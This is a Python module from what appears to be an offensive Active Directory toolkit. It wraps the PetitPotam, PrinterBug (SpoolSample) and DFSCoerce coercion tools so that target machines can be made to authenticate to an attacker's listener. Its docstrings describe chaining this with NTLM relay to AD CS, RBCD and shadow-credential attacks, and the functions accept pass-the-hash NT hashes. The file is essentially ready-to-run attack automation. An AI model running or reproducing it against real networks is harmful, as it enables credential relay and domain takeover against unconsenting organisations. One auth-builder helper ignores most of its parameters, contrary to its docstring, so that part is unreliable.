"""Async subprocess wrappers for authentication coercion tools.

Wraps PetitPotam, PrinterBug (SpoolSample), and DFSCoerce — tools that
force a target machine to authenticate back to an attacker-controlled
listener, enabling NTLM relay attacks.

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,       # raw stdout
        "error": str | None,  # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import logging
import shlex
from typing import Any

logger = logging.getLogger("pathstrike.tools.coercion")

_SENSITIVE_FLAGS = {"-p", "-password", "-hashes"}


def _redact_cmd(cmd: list[str]) -> str:
    """Redact sensitive arguments from a command list for logging."""
    redacted = []
    skip_next = False
    for i, arg in enumerate(cmd):
        if skip_next:
            redacted.append("***REDACTED***")
            skip_next = False
        elif arg in _SENSITIVE_FLAGS and i + 1 < len(cmd):
            redacted.append(arg)
            skip_next = True
        else:
            redacted.append(arg)
    return " ".join(shlex.quote(c) for c in redacted)


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_coercion_tool(
    tool_name: str,
    args: list[str],
    timeout: int = 30,
) -> dict[str, Any]:
    """Run a coercion tool by name and return captured output.

    Args:
        tool_name: Script name (e.g. ``"PetitPotam.py"``, ``"printerbug.py"``).
        args: CLI arguments for the tool.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    cmd = [tool_name, *args]
    logger.debug("Executing: %s", _redact_cmd(cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "error": None,
        "tool": tool_name,
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            result["error"] = stderr or f"{tool_name} exited with code {proc.returncode}"
            logger.error("%s failed (rc=%d): %s", tool_name, proc.returncode, result["error"])
            return result

        # Check for success indicators in output
        success_markers = ["successfully", "triggered", "coerced", "attack worked"]
        if any(marker in stdout.lower() for marker in success_markers):
            result["success"] = True
        elif "error" not in stdout.lower() and "failed" not in stdout.lower():
            result["success"] = True

        logger.debug("%s completed (%d bytes output)", tool_name, len(stdout))

    except asyncio.TimeoutError:
        result["error"] = f"{tool_name} timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.error(result["error"])
    except FileNotFoundError:
        result["error"] = (
            f"{tool_name} not found. Ensure it is installed and on PATH."
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])
    except OSError as exc:
        result["error"] = f"OS error launching {tool_name}: {exc}"
        result["error_type"] = "os_error"
        logger.error(result["error"])

    return result


# ---------------------------------------------------------------------------
# Authentication argument builder
# ---------------------------------------------------------------------------


def build_coercion_auth(
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
) -> list[str]:
    """Build authentication arguments for coercion tools.

    Most coercion tools accept ``domain/user:password`` as a positional
    argument, similar to Impacket conventions.

    Args:
        domain: AD domain name.
        username: Authenticating username.
        password: Plaintext password.
        nt_hash: NT hash for pass-the-hash.

    Returns:
        List of CLI arguments.
    """
    args: list[str] = []
    if nt_hash:
        args.extend(["-hashes", f":{nt_hash}"])
    return args


def build_coercion_target(
    domain: str,
    username: str,
    password: str | None = None,
    nt_hash: str | None = None,
) -> str:
    """Build the ``domain/user:password`` target string.

    Args:
        domain: AD domain name.
        username: Authenticating username.
        password: Plaintext password (omitted if using hash).
        nt_hash: NT hash (password field left empty).

    Returns:
        Formatted credential string.
    """
    cred = password if password and not nt_hash else ""
    return f"{domain}/{username}:{cred}"


# ---------------------------------------------------------------------------
# Convenience wrappers
# ---------------------------------------------------------------------------


async def run_petitpotam(
    listener_ip: str,
    target_ip: str,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Run PetitPotam.py to coerce NTLM authentication from a target.

    PetitPotam exploits MS-EFSRPC (Encrypting File System Remote Protocol)
    to force a target machine to authenticate to an attacker-controlled
    listener.  This is commonly chained with NTLM relay to AD CS (ESC8)
    or LDAP for RBCD/shadow credential attacks.

    Args:
        listener_ip: Attacker's listener IP address.
        target_ip: Target machine IP to coerce.
        domain: AD domain for authentication (None for unauthenticated).
        username: Username for authenticated mode.
        password: Password for authenticated mode.
        nt_hash: NT hash for pass-the-hash authentication.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    args: list[str] = [listener_ip, target_ip]

    if username and domain:
        args.extend(["-u", username, "-d", domain])
        if password:
            args.extend(["-p", password])
        if nt_hash:
            args.extend(["-hashes", f":{nt_hash}"])

    return await run_coercion_tool("PetitPotam.py", args, timeout=timeout)


async def run_printerbug(
    listener_ip: str,
    target_ip: str,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Run printerbug.py (SpoolSample) to coerce authentication via MS-RPRN.

    The Printer Bug exploits the Print Spooler service (MS-RPRN) to force
    a target to authenticate back to an attacker-controlled host.  Requires
    the Print Spooler service to be running on the target.

    Args:
        listener_ip: Attacker's listener IP address.
        target_ip: Target machine IP to coerce.
        domain: AD domain for authentication.
        username: Username for authentication.
        password: Password for authentication.
        nt_hash: NT hash for pass-the-hash.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    # printerbug.py format: domain/user:password@target listener
    cred = password or ""
    if nt_hash:
        cred = ""

    target_str = f"{domain}/{username}:{cred}@{target_ip}" if domain and username else target_ip
    args: list[str] = [target_str, listener_ip]

    if nt_hash:
        args.extend(["-hashes", f":{nt_hash}"])

    return await run_coercion_tool("printerbug.py", args, timeout=timeout)


async def run_dfscoerce(
    listener_ip: str,
    target_ip: str,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nt_hash: str | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """Run DFSCoerce.py to coerce authentication via MS-DFSNM.

    DFSCoerce exploits the Distributed File System Namespace Management
    protocol to force NTLM authentication from a target machine.

    Args:
        listener_ip: Attacker's listener IP address.
        target_ip: Target machine IP to coerce.
        domain: AD domain for authentication.
        username: Username for authentication.
        password: Password for authentication.
        nt_hash: NT hash for pass-the-hash.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    args: list[str] = ["-l", listener_ip, "-d", domain or ""]

    if username:
        args.extend(["-u", username])
    if password:
        args.extend(["-p", password])
    if nt_hash:
        args.extend(["-hashes", f":{nt_hash}"])

    args.append(target_ip)

    return await run_coercion_tool("DFSCoerce.py", args, timeout=timeout)
